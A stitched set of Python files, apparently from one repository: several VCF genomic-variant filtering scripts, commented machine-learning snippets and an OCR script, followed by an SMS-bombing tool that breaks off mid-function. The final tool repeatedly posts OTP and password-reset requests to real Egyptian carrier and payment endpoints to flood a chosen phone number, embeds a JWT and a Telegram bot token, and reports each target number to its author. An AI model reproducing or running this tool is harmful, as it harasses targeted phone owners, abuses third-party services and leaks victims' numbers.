            :param data_frame - pandas dataframe
            :param filename - the new filename for the target vcf
            :param rest_data - the rest of the data in the file
        output:
            :return : vcf file 
"""


def write_vcf(data_frame, filename, rest_data):
    if filename.endswith('.gz'):
        f = gzip.open(filename, 'wt')
    else:
        f = open(filename, 'w')
    header = ''.join([i for i in rest_data])
    f.write(header)
    for index, row in data_frame.iterrows():
        f.write('\t'.join(row.values.tolist()) + '\n')
    f.close()


"""
    this function call the all functions take  only the directory
        input:
            :param directory_name - directory name
        output:
            :return : list of files that in the target directory
"""


def getDirectory(directory_name):
    vcf_files = [file for file in os.listdir(directory_name)
                 if file.endswith('.vcf') or file.endswith('vcf.gz')]
    return vcf_files


"""
    this function call the all functions take  only the directory
        input:
            :param directory_name - directory name
        output:
            write the file with the same name with counter
"""


def main(dictionary_name, save_folder):
    os.makedirs(os.path.join(save_folder, "filtered data/AD_filtered"), exist_ok=True)
    for i, file_name in enumerate(getDirectory(dictionary_name)):
        df, data = read_vcf(os.path.join(dictionary_name, file_name))
        write_vcf(returnToDataFrame(df, biggerThanOperation(dictionary(df))),
                  os.path.join(os.path.join(save_folder, "filtered data/AD_filtered"), file_name + '.vcf'),
                  data)


"""

 calling all the functions in main

"""

if __name__ == '__main__':
    main('new_vcf_file_to_filtered/', 'new_vcf_file_to_filtered')

import pandas as pd
import gzip

"""
    this function read file vcf and return it to dataframe
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return vcf : vcf as dataframe
"""


def read_vcf(filename):
    print(filename)
    if filename.endswith('.vcf.gz'):
        try:
            f = gzip.open(filename, 'rt', encoding='utf-8')
            # Check the gzip header to confirm if the file is valid
            f.read(1)
            f.seek(0)
        except OSError:
            f = open(filename, 'r', encoding='utf-8')
    elif filename.endswith('.vcf'):
        f = open(filename, 'r', encoding='utf-8')
    else:
        raise ValueError("Invalid file extension: {}".format(filename))

    header = []
    data1 = []
    data2 = []
    for line in f:
        if line.startswith('#CHROM'):
            header.append(line.strip())
        if line.startswith('#'):
            data2.append(line)
        else:
            data1.append(line.strip())
    f.close()
    header = header[0].split('\t')
    data1 = [line.split('\t') for line in data1]
    dataframe = pd.DataFrame(data1, columns=header)
    return dataframe, data2


"""
    this function get dataframe and convert it to dictionary
        input:
            :param Data - pandas dataframe : vcf data 
        output:
            :return : dict() that has the key and value for comparing 
"""


def dictionary(dataframe):
    dic = dict()
    for i, index in enumerate(dataframe.index.tolist()):
        dic[index] = dataframe.iloc[i][-1].split(":")
    return dic


"""
    this function get dataframe and position numbers after comparing to get them from the dataframe
        input:
            :param Data - pandas dataframe : vcf data
            :param Position - position numbers : list of positions numbers
        output:
            :return : dataframe that has the target positions 
"""


def returnToDataFrame(dataframe, position):
    return dataframe.iloc[position]


"""
    this function get dictionary of the dataframe and splitting and compare the condition that has 
    the target positions indexes
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return : list that has the target positions indexes 
"""


def biggerThanOperation(dic):
    matched_data = []
    for key, value in dic.items():
        if int(value[1].split(',')[0]) >= 3 and int(value[1].split(',')[1]) >= 3:
            matched_data.append(key)
    return matched_data


"""
    this function write the target vcf data
        input:
            :param data_frame - pandas dataframe
            :param filename - the new filename for the target vcf
            :param rest_data - the rest of the data in the file
        output:
            :return : vcf file 
"""


def write_vcf(data_frame, filename, rest_data):
    if filename.endswith('.gz'):
        f = gzip.open(filename, 'wt')
    else:
        f = open(filename, 'w')
    header = ''.join([i for i in rest_data])
    f.write(header)
    for index, row in data_frame.iterrows():
        f.write('\t'.join(row.values.tolist()) + '\n')
    f.close()


"""

 calling all the functions in main

"""

if __name__ == '__main__':
    df, data = read_vcf('new_vcf_file_to_filtered/A1_T1_filtered.vcf')
    write_vcf(returnToDataFrame(df, biggerThanOperation(dictionary(df))), 'A1_T1_filtered_with_AD.vcf', data)

import pandas as pd
import gzip
import os

"""
    this function read file vcf and return it to dataframe
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return vcf : vcf as dataframe
"""


def read_vcf(filename):
    print(filename)
    if filename.endswith('.vcf.gz'):
        try:
            f = gzip.open(filename, 'rt', encoding='utf-8')
            # Check the gzip header to confirm if the file is valid
            f.read(1)
            f.seek(0)
        except OSError:
            f = open(filename, 'r', encoding='utf-8')
    elif filename.endswith('.vcf'):
        f = open(filename, 'r', encoding='utf-8')
    else:
        raise ValueError("Invalid file extension: {}".format(filename))

    header = []
    data1 = []
    data2 = []
    for line in f:
        if line.startswith('#CHROM'):
            header.append(line.strip())
        if line.startswith('#'):
            data2.append(line)
        else:
            data1.append(line.strip())
    f.close()
    header = header[0].split('\t')
    data1 = [line.split('\t') for line in data1]
    dataframe = pd.DataFrame(data1, columns=header)
    return dataframe, data2


"""
    this function get dataframe and convert it to dictionary
        input:
            :param Data - pandas dataframe : vcf data 
        output:
            :return : dict() that has the key and value for comparing 
"""


def dictionary(dataframe):
    dic = dict()
    for i, index in enumerate(dataframe.index.tolist()):
        dic[index] = dataframe.iloc[i][-1].split(":")
    return dic


"""
    this function get dataframe and position numbers after comparing to get them from the dataframe
        input:
            :param Data - pandas dataframe : vcf data
            :param Position - position numbers : list of positions numbers
        output:
            :return : dataframe that has the target positions 
"""


def returnToDataFrame(dataframe, position):
    return dataframe.iloc[position]


"""
    this function get dictionary of the dataframe and splitting and compare the condition that has 
    the target positions indexes
        input:
            :param Data - pandas dataframe : vcf data
            :param Data - low the lowest number of the range that user want to compare
            :param Data - high the highest number of the range that user want to compare

        output:
            :return : list that has the target positions indexes 
"""


def fromOneToThirty(dic, low, high):
    matched_data = []
    for key, value in dic.items():
        if ((float(value[2]) * 100) >= low) and ((float(value[2]) * 100) <= high):
            matched_data.append(key)
    return matched_data


"""
    this function write the target vcf data
        input:
            :param data_frame - pandas dataframe
            :param filename - the new filename for the target vcf
            :param rest_data - the rest of the data in the file
        output:
            :return : vcf file 
"""


def write_vcf(data_frame, filename, rest_data):
    if filename.endswith('.gz'):
        f = gzip.open(filename, 'wt')
    else:
        f = open(filename, 'w')
    header = ''.join([i for i in rest_data])
    f.write(header)
    for index, row in data_frame.iterrows():
        f.write('\t'.join(row.values.tolist()) + '\n')
    f.close()


"""
    this function call the all functions take  only the directory
        input:
            :param directory_name - directory name
        output:
            :return : list of files that in the target directory
"""


def getDirectory(directory_name):
    vcf_files = [file for file in os.listdir(directory_name)
                 if file.endswith('.vcf') or file.endswith('vcf.gz')]
    return vcf_files


"""
    this function call the all functions take  only the directory
        input:
            :param directory_name - directory name
        output:
            write the file with the same name with counter
"""


def main(dictionary_name, save_folder):
    os.makedirs(os.path.join(save_folder, "filtered data/AF_filtered"), exist_ok=True)
    for i, file_name in enumerate(getDirectory(dictionary_name)):
        df, data = read_vcf(os.path.join(dictionary_name, file_name))
        # the function calling fromOneToThirty has two const numbers that you can change them 1.0,30.0
        write_vcf(returnToDataFrame(df, fromOneToThirty(dictionary(df), 1.0, 30.0)),
                  os.path.join(os.path.join(save_folder, "filtered data/AF_filtered"), file_name + '.vcf'),
                  data)


"""

 calling all the functions in main

"""

if __name__ == '__main__':
    main('new_vcf_file_to_filtered', 'new_vcf_file_to_filtered')

import pandas as pd
import gzip

"""
    this function read file vcf and return it to dataframe
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return vcf : vcf as dataframe
"""


def read_vcf(filename):
    print(filename)
    if filename.endswith('.vcf.gz'):
        try:
            f = gzip.open(filename, 'rt', encoding='utf-8')
            # Check the gzip header to confirm if the file is valid
            f.read(1)
            f.seek(0)
        except OSError:
            f = open(filename, 'r', encoding='utf-8')
    elif filename.endswith('.vcf'):
        f = open(filename, 'r', encoding='utf-8')
    else:
        raise ValueError("Invalid file extension: {}".format(filename))

    header = []
    data1 = []
    data2 = []
    for line in f:
        if line.startswith('#CHROM'):
            header.append(line.strip())
        if line.startswith('#'):
            data2.append(line)
        else:
            data1.append(line.strip())
    f.close()
    header = header[0].split('\t')
    data1 = [line.split('\t') for line in data1]
    dataframe = pd.DataFrame(data1, columns=header)
    return dataframe, data2


"""
    this function get dataframe and convert it to dictionary
        input:
            :param Data - pandas dataframe : vcf data 
        output:
            :return : dict() that has the key and value for comparing 
"""


def dictionary(dataframe):
    dic = dict()
    for i, index in enumerate(dataframe.index.tolist()):
        dic[index] = dataframe.iloc[i][-1].split(":")
    return dic


"""
    this function get dataframe and position numbers after comparing to get them from the dataframe
        input:
            :param Data - pandas dataframe : vcf data
            :param Position - position numbers : list of positions numbers
        output:
            :return : dataframe that has the target positions 
"""


def returnToDataFrame(dataframe, position):
    return dataframe.iloc[position]


"""
    this function get dictionary of the dataframe and splitting and compare the condition that has 
    the target positions indexes
        input:
            :param Data - pandas dataframe : vcf data
            :param Data - low the lowest number of the range that user want to compare
            :param Data - high the highest number of the range that user want to compare
            
        output:
            :return : list that has the target positions indexes 
"""


def fromOneToThirty(dic, low, high):
    matched_data = []
    for key, value in dic.items():
        if ((float(value[2]) * 100) >= low) and ((float(value[2]) * 100) <= high):
            matched_data.append(key)
    return matched_data


"""
    this function write the target vcf data
        input:
            :param data_frame - pandas dataframe
            :param filename - the new filename for the target vcf
            :param rest_data - the rest of the data in the file
        output:
            :return : vcf file 
"""


def write_vcf(data_frame, filename, rest_data):
    if filename.endswith('.gz'):
        f = gzip.open(filename, 'wt')
    else:
        f = open(filename, 'w')
    header = ''.join([i for i in rest_data])
    f.write(header)
    for index, row in data_frame.iterrows():
        f.write('\t'.join(row.values.tolist()) + '\n')
    f.close()

"""

 calling all the functions in main

"""

if __name__ == '__main__':
    df, data = read_vcf('new_vcf_file_to_filtered/A1_T1_filtered.vcf')
    write_vcf(returnToDataFrame(df, fromOneToThirty(dictionary(df), 1.0, 30.0)), 'A1_T1_filtered_with_AF.vcf', data)

# import numpy as np
# from sklearn.linear_model import LinearRegression
# #1.55, 2.51, 3.11, 4.46, 5.19, 6.93, 7.86, 8.15, 9.44, 10.20
# # User input for the array
# input_data = [float(input(f"Enter number {i+1}: ")) for i in range(10)]
#
# # Prepare input and output data
# X = np.array(input_data[:-5]).reshape(-1, 1)
# y = np.array(input_data[5:])
#
# # Build the linear regression model
# model = LinearRegression()
#
# # Train the model
# model.fit(X, y)
#
# # Generate predictions
# next_input = np.array(input_data[-5:]).reshape(-1, 1)
# predicted_numbers = model.predict(next_input)
# print("Predicted Numbers:",  predicted_numbers)
# 1.55, 2.51, 3.11, 4.46, 5.19, 6.93, 7.86, 8.15, 9.44, 10.20
# float(input(f"Enter number {i+1}: ")) for i in range(10)
# univariate lstm example
# import numpy as np
# from keras.models import Sequential
# from keras.layers import Dense
#
# # define the input sequence
# X = np.array([1.55, 2.51, 3.11, 4.46, 5.19, 6.93, 7.86, 8.15, 9.44, 10.20])
#
# # define the target sequence
# y = np.array([11.30, 12.45, 13.78, 14.90, 15.64])
#
# # define the window size
# window_size = 5
#
# # create a sequential model
# model = Sequential()
#
# # add a dense layer with one neuron and input dimension 5
# model.add(Dense(1, input_dim=window_size))
#
# # compile the model with mean squared error loss and the Adam optimizer
# model.compile(loss='mse', optimizer='adam')
#
# # train the model for 100 epochs, using the input sequence as input and the target sequence as output
# # use a sliding window approach to generate training data
# for i in range(len(X) - window_size):
#     window = X[i:i+window_size]
#     target = y
#     model.fit(window.reshape(1, window_size), target.reshape(1, 5), epochs=100)
#
# # use the model to predict the next 5 numbers given a new input sequence
# # use a sliding window approach to generate input data
# input_sequence = np.array([11.23,12.90,13.75,14.64,15.93,16.66,17.43,18.52,19.61,20.33])
# predictions = []
# for i in range(len(input_sequence) - window_size):
#     window = input_sequence[i:i+window_size]
#     prediction = model.predict(window.reshape(1, window_size))
#     predictions.append(prediction)
#
# # print the predicted next 5 numbers
# print(predictions)
import gzip
import pandas as pd
import os

"""
    this function read file vcf and return it to dataframe
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return vcf : vcf as dataframe
"""


def read_vcf(filename):
    print(filename)
    if filename.endswith('.vcf.gz'):
        try:
            f = gzip.open(filename, 'rt', encoding='utf-8')
            # Check the gzip header to confirm if the file is valid
            f.read(1)
            f.seek(0)
        except OSError:
            f = open(filename, 'r', encoding='utf-8')
    elif filename.endswith('.vcf'):
        f = open(filename, 'r', encoding='utf-8')
    else:
        raise ValueError("Invalid file extension: {}".format(filename))

    header = []
    data1 = []
    data2 = []
    for line in f:
        if line.startswith('#CHROM'):
            header.append(line.strip())
        if line.startswith('#'):
            data2.append(line)
        else:
            data1.append(line.strip())
    f.close()
    header = header[0].split('\t')
    data1 = [line.split('\t') for line in data1]
    dataframe = pd.DataFrame(data1, columns=header)
    return dataframe, data2


"""
    this function get dataframe and convert it to dictionary
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return : dict() that has the key and value for comparing
"""


def dictionary(dataframe):
    dic = dict()
    for i, index in enumerate(dataframe.index.tolist()):
        dic[index] = dataframe.iloc[i]['INFO']
    return dic


"""
    this function get dataframe and position numbers after comparing to get them from the dataframe
        input:
            :param Data - pandas dataframe : vcf data
            :param Position - position numbers : list of positions numbers
        output:
            :return : dataframe that has the target positions
"""


def returnToDataFrame(dataframe, position):
    return dataframe.iloc[position]


"""
    this function get dictionary of the dataframe and splitting and compare the condition that has the target DP
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return : dataframe that has the target DP
"""


def splittingAndComparing(dic):
    matched_data = []
    for key, value in dic.items():
        data_dictionary = {}
        for item in value.split(';'):
            split_item = item.split('=')
            if len(split_item) == 2:
                data_dictionary[split_item[0]] = split_item[1]

        if int(data_dictionary.get('DP', '30')) >= 30:
            matched_data.append(key)

    return matched_data


"""
    this function write the target vcf data
        input:
            :param data_frame - pandas dataframe
            :param filename - the new filename for the target vcf
            :param rest_data - the rest of the data in the file
        output:
            :return : vcf file
"""


def write_vcf(data_frame, filename, rest_data):
    if filename.endswith('.gz'):
        f = gzip.open(filename, 'wt')
    else:
        f = open(filename, 'w')
    header = ''.join([i for i in rest_data])
    f.write(header)
    for index, row in data_frame.iterrows():
        f.write('\t'.join(row.values.tolist()) + '\n')
    f.close()


"""
    this function call the all functions take  only the directory
        input:
            :param directory_name - directory name
        output:
            :return : list of files that in the target directory
"""


def getDirectory(directory_name):
    vcf_files = [file for file in os.listdir(directory_name)
                 if file.endswith('.vcf.gz') or file.endswith('.vcf')]
    return vcf_files


"""
    this function call the all functions take  only the directory
        input:
            :param directory_name - directory name
        output:
            write the file with the same name with counter
"""


def main(dictionary_name, save_folder):
    os.makedirs(os.path.join(save_folder, "filtered data/DP_filtration"), exist_ok=True)
    for i, file_name in enumerate(getDirectory(dictionary_name)):
        df, data = read_vcf(os.path.join(dictionary_name, file_name))
        write_vcf(returnToDataFrame(df, splittingAndComparing(dictionary(df))),
                  os.path.join(os.path.join(save_folder, "filtered data"), file_name + '.vcf'),
                  data)


"""

    calling all the functions in main

"""

if __name__ == '__main__':
    """
    
        main('take the path that have the unfiltered vcf files data',
                    'the path to save output filtered the vcf files data') 
        the path should be written as this C:/Users/jaguar/PycharmProjects/projects/
                                           your Drive:/ the path to the desirable folder that have vcf files data
    
    """
    main('C:/Users/jaguar/PycharmProjects/projects/', 'C:/Users/jaguar/PycharmProjects/projects/')

import pytesseract as ts
from PIL import Image
import os

def getDirectory(directory_name):
    vcf_files = [file for file in os.listdir(directory_name)]
    return vcf_files

def main(dictionary_name):
    for i in range(len(getDirectory(dictionary_name))):
        with open('135(1).txt', 'w') as f:
            f.write(ts.image_to_string(Image.open((os.path.join(dictionary_name, getDirectory(dictionary_name)[i])))))
        f.close()


ts.pytesseract.tesseract_cmd = r'C:/Users/jaguar/AppData/Local/Programs/Tesseract-OCR/tesseract.exe'
# main('screenshots/')
imgs = ts.image_to_string(Image.open('C:/Users/jaguar/Documents/New Folder (2)/rout front end/rout frontend js/week 9/Screenshot 2023-08-08 022830.png'))
print(imgs)

import webbrowser
import os, sys, time
import random
import hashlib

os.system("clear")
os.system('git pull')
os.system("clear")
try:
    import requests
    import pyfiglet
    from bs4 import BeautifulSoup
except:
    os.system("pip install --upgrade pip")
    os.system("pip install requests")
    os.system("pip install pyfiglet")
    os.system("pip install bs4")
    os.system("clear")
    os.system('python spam-sms-Egypt.py')

token = "5848610949:AAGG_fJJY5fcwWxHNDfFBlMuUv0Bnqi5aEw"

Id = "1325332071"

password = input('Password:')
# ادخل باص
if password == '18':
    print("Welcome sir Hitler")

else:
    print("Error password")
    webbrowser.open('https://api.whatsapp.com/send?phone=201280670856')

    sys.exit()

# color
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
B = '\033[1;34m'
M = '\033[1;35m'
P = '\033[1;36m'
W = '\033[1;37m'
X = '\033[1;38m'
A = '\033[1;39m'

global s
global n
global j

j = ("+")
n = ('\n')
s = requests.session()

print(R + pyfiglet.figlet_format("spam sms by "))
print(pyfiglet.figlet_format("#~>   Hitler "))

code = """ 
-------------------------------------------------------------------------
- Code BY : Hitler hack
-------------------------------------------------------------------------
      هتكتب اي رقم في ال id telegram 

      مثال 49467
      وانتر وابدا الاسبام 
"""

print(W + code)


#######==============################
def sub():
    try:
        id_user = int(input(P + '[+]Enter id Telegram:\033[1;37m'))

        url = f"https://api.telegram.org/bot{token}/getchatmember?chat_id=@Oppsl&user_id={id_user}"
        req = requests.get(url).text

        # print(req)

        if 'member' in req:
            print(n + G + '[+]welcome sir and enjoy' + n)
            pass
        elif 'left' in req:
            print(n + R + '[-]Please subscribe first to the Telegram channel' + n)
            time.sleep(2)
            webbrowser.open('https://t.me/Hitler')
            sys.exit()

    except Exception as e:
        print(n + R + '[-]Please Enter id Telegram' + n)
        # sys.exit()
        sub()


sub()


#######==============################


def we():
    try:
        number = input(n + P + "[+]Enter Number:\033[1;37m")
        count = int(input(n + P + "[+]Enter Count:\033[1;37m"))
        print(n)
        req2 = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->>{count}  we")
        # print(req2.text)

        url = "https://api-my.te.eg/api/user/mobile/resetpassword/initiate"
        headers = {'Host': 'api-my.te.eg',
                   'Connection': 'keep-alive',
                   'Content-Length': '59',
                   'Accept': 'application/json, text/plain, */*',
                   'Jwt': 'eyJraWQiOiIxIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJ0ZS5jb20iLCJleHAiOjI1ODk5MDkxOTQsImp0aSI6IkViTllXQlAxWG9hcTNtaEt4NmVjcHciLCJpYXQiOjE2NDM4MjkxOTQsIm5iZiI6MTY0MzgyOTA3NCwic3ViIjoiQW5vbnltb3VzIiwicm9sZXMiOlsiUk9MRV9BTk9OWU1PVVMiXSwiSVAiOiIxMDIuMTg1LjExMy4xOTMsIDEwLjE2LjE0Ni41OCwgMTAuMTkuMjQ3LjI0MSIsImNoYW5uZWxJZCI6IldFQl9BUFAifQ.a8grOVPetI1jGvCfVLmsrVYI5Dp5_lFXhq-CMdOvsBESV3QH5S0Iw_RVSVFIfxXtGCkUcfmF_aaJIjlrL3WdZzqm0IQUgdXYUACFywwEj-LlVv4lW294U4v4O3IQCXkXNhff8DtjF128AvV4YY34RArz__Y4zPR4q6bfabE-XBexyfK3mWNuf20r7aRJoDIjk--c_aMZpj0vB9mTa91VbBxBbmlSst_lzi-d8yBGvw6c37GhmQZ-ybA2wAOsrS4uUeGEyS2IDTewnL3Qm9l5X5SXW9ekhNmiamJbsOFrWCrTgnm2yzNx_pFQBkdY0eJwUhuBayg9L5SDKC4krplenQ',
                   'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2040 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36',
                   'Content-Type': 'application/json',
                   'Origin': 'https://my.te.eg',
                   'X-Requested-With': 'mark.via.gp',
                   'Sec-Fetch-Site': 'same-site',
                   'Sec-Fetch-Mode': 'cors',
                   'Sec-Fetch-Dest': 'empty',
                   'Referer': 'https://my.te.eg/',
                   'Accept-Encoding': 'gzip, deflate',
                   'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7'}
        data = {
            "header": {
                "msisdn": number,
                "locale": "en"
            },
            "body": {}}

        zz = 0
        for i in range(0, count):
            try:
                req = requests.post(url, headers=headers, json=data).text
                # print(req)
                if "The verification code has been sent" in req:
                    try:
                        zz += 1
                        print(G + f"[+]Done Send ✅ {[zz]} spam sms")
                    except Exception as e:
                        print(R + e)
                elif 'Service number or password is incorrect' in req:
                    print(R + f'[-]Error Number [ {number} ] ,Not in we Try Again')
                    we()

                else:
                    print(R + '[-]Error Try Again')
                    we()

            except Exception as g:
                print(R + "[-]Failed connect to internet")
                pass

    except Exception as r:
        print(R + n + "[-]Error Number or count Try again ")
        we()


#######==============################

#######==============################


def orange():
    try:
        number = input(n + P + "[+]Enter Number:\033[1;37m")
        count = int(input(n + P + "[+]Enter Count:\033[1;37m"))
        print(n)
        req2 = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->>{count}  orange")
        url = 'http://oleorange.com/login'
        head = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2040) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36'}
        req = requests.get(url, headers=head)
        re = req.cookies
        coooki = re['ASP.NET_SessionId']
        soup = BeautifulSoup(req.content, "html.parser")
        crumb = soup.find_all('input', {'name': '__VIEWSTATE'})[0].get('value')
        acrumb = soup.find_all('input', {'name': '__EVENTVALIDATION'})[0].get('value')

        headers = {'Host': 'oleorange.com',
                   'Connection': 'keep-alive',
                   'Content-Length': '443',
                   'Cache-Control': 'max-age=0',
                   'Upgrade-Insecure-Requests': '1',
                   'DNT': '1',
                   'Origin': 'http://oleorange.com',
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2040 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36',
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                   'Referer': 'http://oleorange.com/login',
                   'Accept-Encoding': 'gzip, deflate',
                   'Accept-Language': 'en',
                   'Cookie': f'ASP.NET_SessionId={coooki}'}
        data = {'__LASTFOCUS': '',
                '__EVENTTARGET': '',
                '__EVENTARGUMENT': '',
                '__VIEWSTATE': f'{crumb}',
                '__VIEWSTATEGENERATOR': 'C2EE9ABB',
                '__EVENTVALIDATION': f'{acrumb}',
                'txtPhone': number,
                'btnLogin': 'الدخول'}

        zz = 0
        for i in range(0, count):
            try:
                req = requests.post(url, headers=headers, json=data).text
                # print(req)
                if "login" in req:
                    try:
                        zz += 1
                        print(G + f"[+]Done Send ✅ {[zz]} spam sms")
                    except Exception as e:
                        print(R + e)

                else:
                    print(R + '[-]Error Try Again')
                    orange()

            except Exception as g:
                print(R + "[-]Failed connect to internet")
                pass

    except Exception as r:
        print(R + n + "[-]Error Number or count Try again ")
        orange()


#######==============################

#######==============################

def vodafone():
    try:
        number = input(n + P + "[+]Enter Number:\033[1;37m")
        count = int(input(n + P + "[+]Enter Count:\033[1;37m"))
        print(n)
        req2 = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->>{count} vodafone")
        url = "https://gateway.mondiapay.com/mondiapay-vodafone-eg-v1/web/authorize/pin/send"
        headers = {
            'Host': 'gateway.mondiapay.com',
            'Connection': 'keep-alive',
            'Content-Length': '275',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Origin': 'https://gateway.mondiapay.com',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2040) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://gateway.mondiapay.com/mondiapay-vodafone-eg-v1/web/authorize?response_type=code&client_id=d86b9aa4-719f-4f33-aaf1-97f696194df2&redirect_uri=http%3A%2F%2Fvhub.vuclip.com%2Fapi%2Fng%2Fheresponse.php%3Fhtxnid%3D9887097&customerData=snjtT9QWtcJAOOTR3zirbdcLUhpExshWqjqrg%2BzDguwL7xhSDVmmMO1tm7IUzAkHaWxlVcwZra%2FoWh87kjQhUvvNVkG8f9H1RbF1pFLHQW%2FMPgHYVGVDqzlvzVLSaAeL',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en,ar;q=0.9'}

        data = {'msisdn': number,
                'clientId': 'd86b9aa4-719f-4f33-aaf1-97f696194df2',
                'redirectUrl': 'http://vhub.vuclip.com/api/ng/heresponse.php?htxnid=9887097',
                'metaData.cssUrl': 'https://menad2c.mondiamedia.com/mpay/mondiapay-vodafone-eg/default/css/app.css',
                'Login': 'LOGIN'}

        zz = 0
        for i in range(0, count):
            try:
                req = requests.post(url, headers=headers, data=data).text
                # print(req)
                if "تأكيد الرمز" in req:
                    try:
                        zz += 1
                        print(G + f"[+]Done Send ✅ {[zz]} spam sms")
                    except Exception as e:
                        print(R + e)
                elif "رقم الهاتف غير صحيح" in req:
                    print(R + f'[-]Error Number [ {number} ] , Try Again')
                    vodafone()

                else:
                    print(R + '[-]Error Try Again')
                    vodafone()

            except Exception as g:
                print(R + "[-]Failed connect to internet")
                pass

    except Exception as r:
        print(R + n + "[-]Error Number or count Try again ")
        vodafone()


#######==============################

#######==============################


def All1():
    try:
        number = input(n + P + "[+]Enter Number:\033[1;37m")
        count = int(input(n + P + "[+]Enter Count:\033[1;37m"))
        print(n)
        req2 = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->>{count} All1")
        url = "https://backend.forsaegypt.com/api/v1/accounts/verification/phone/"
        headers = {'accept': 'application/json',
                   'accept-language': 'en',
                   'Content-Type': 'application/json',
                   'Content-Length': '25',
                   'Host': 'backend.forsaegypt.com',
                   'Connection': 'Keep-Alive',
                   'Accept-Encoding': 'gzip',
                   'User-Agent': 'okhttp/4.9.2'}
        data = {"phone": f"+2{number}"}
        zz = 0
        for i in range(0, count):
            try:
                req = requests.post(url, headers=headers, json=data).text
                # print(req)
                if "sent" in req:
                    try:
                        zz += 1
                        print(G + f"[+]Done Send ✅ {[zz]} spam sms")
                    except Exception as e:
                        print(R + e)
                elif "The phone number entered is not valid." in req:
                    print(R + f'[-]Error Number [ {number} ] ,Try Again')
                    All1()

                else:
                    print(R + '[-]Error Try Again')
                    All1()

            except Exception as g:
                print(R + "[-]Failed connect to internet")
                pass

    except Exception as r:
        print(R + n + "[-]Error Number or count Try again ")
        All1()


#######==============################

#######==============################


def All2():
    try:
        number = input(n + P + "[+]Enter Number:\033[1;37m")
        count = int(input(n + P + "[+]Enter Count:\033[1;37m"))
        print(n)
        req2 = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->>{count}")
        url = "https://offline-pos-gateway.opayeg.com/register/sendOTP/mobile"

        headers = {
            'Host': 'offline-pos-gateway.opayeg.com',
            'source_name': 'oms',
            'versioncode': '2097216',
            'nettype': '1',
            'token': '',
            'authorization': '',
            'locationinfo': '0.0,0.0',
            'location': '0.0,0.0',
            'app_id': '1672475213174-5017551600224729491',
            'device_id': '117172D5DBB012AC815770C581B29A0B',
            'pn': 'team.opay.pos.egypt.mobileapp',
            'version_code': '2097216',
            'version_name': '2.0.4.115',
            'country': '',
            'network_ip': '',
            'trace_id': 'e7512759-95e8-48a4-912c-3ba3397a5a3f',
            'model': 'SM-J700H',
            'dma': 'samsung',
            'brand': 'samsung',
            'app': '9',
            'platform': 'Android',
            'isvirtualdevice': 'false',
            'mcc': '',
            'role': '',
            'paybill': '1',
            'blackbox': '',
            'uid': '',
            'campaign': '',
            'mediasource': '',
            'net_format': 'wifi',
            'trans_id': 'bdd5a75f9e3b437198e278d884e065a6',
            'request_tsp': '1672475278089',
            'clientsource': 'apppos',
            'language': 'en_US',
            'deviceid': 'RISK#MERCHANT#117172D5DBB012AC815770C581B29A0B',
            'device': 'samsung_SM-J700H',
            'content-type': 'application/json; charset=UTF-8',
            'content-length': '24',
            'accept-encoding': 'gzip',
            'user-agent': 'okhttp/4.9.0'}

        data = {"mobile": number}

        req = requests.post(url, headers=headers, json=data).text
        # print(req)
        zz = 0
        for i in range(0, count):
            try:
                req = requests.post(url, headers=headers, data=data).text
                print(req)

                if "success" in req:
                    try:
                        zz += 1
                        print(G + f"[+]Done Send ✅ {[zz]} spam sms")
                    except Exception as e:
                        print(R + e)
                elif "يرجى الاتصال بخدمة العملاء" in req:
                    print(R + f'[-]Error Number [ {number} ] ,or website not support this number Try Again')
                    All2()

                else:
                    print(R + '[-]Error Try Again')
                    All2()

            except Exception as g:
                print(R + "[-]Failed connect to internet")
                pass

    except Exception as r:
        print(R + n + "[-]Error Number or count Try again ")
        All2()


#######==============################


#######==============################


def call():
    try:
        number = input(n + P + "[+]Enter Number:\033[1;37m")
        req2 = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->)call")
        asa = '123456789'
        gigk = str(''.join(random.choice(asa) for i in range(10)))
        md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
